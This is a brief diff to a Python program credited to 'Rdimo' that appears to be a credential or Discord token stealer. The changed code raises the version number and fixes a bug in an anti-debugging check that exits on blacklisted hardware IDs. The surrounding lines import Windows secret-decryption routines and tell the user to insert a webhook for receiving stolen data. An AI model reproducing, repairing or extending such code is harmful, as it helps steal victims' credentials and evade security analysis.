@@ -20,7 +20,7 @@ from Crypto.Cipher import AES
 from win32crypt import CryptUnprotectData
 
 __author__ = "Rdimo"
-__version__ = '1.7.8'
+__version__ = '1.7.9'
 __license__ = "GPL-3.0"
 config = {
     # replace WEBHOOK_HERE with your webhook ↓↓ or use the api from https://github.com/Rdimo/Discord-Webhook-Protector
@@ -677,7 +677,7 @@ class AntiDebug(Functions):
                 self.programExit()
 
         for hwid in self.blackListedHWIDS:
-            if self.system_info[0] == hwid:
+            if self.system_info()[0] == hwid:
                 self.programExit()
 
     def specsCheck(self):
